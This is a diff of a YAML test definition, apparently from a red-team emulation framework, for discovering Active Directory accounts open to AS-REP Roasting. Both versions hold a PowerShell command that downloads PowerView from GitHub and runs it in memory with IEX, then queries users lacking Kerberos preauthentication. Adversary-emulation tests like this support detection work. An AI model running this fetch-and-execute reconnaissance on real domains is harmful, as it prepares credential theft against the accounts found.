@@ -1,13 +1,15 @@
-- id: d39b433b-51c1-5b98-9d20-55f78e3254ef
+- requirements: []
   name: Soumaia ART Tests - Get-DomainUser with PowerView
   description: Utilizing PowerView, run Get-DomainUser to identify domain users. Upon execution, progress and info about users within the domain being scanned will be displayed.
   tactic: credential-access
-  technique:
-    attack_id: T1558.004
-    name: 'Steal or Forge Kerberos Tickets: AS-REP Roasting'
-  platforms:
-    windows:
-      psh:
-        command: |-
-          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-          IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose
+  technique_id: T1558.004
+  technique_name: 'Steal or Forge Kerberos Tickets: AS-REP Roasting'
+  executors:
+  - cleanup: []
+    timeout: 60
+    platform: windows
+    name: psh
+    payloads: []
+    parsers: []
+    command: '[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR ''https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1'' -UseBasicParsing); Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose'
+  id: d39b433b-51c1-5b98-9d20-55f78e3254ef
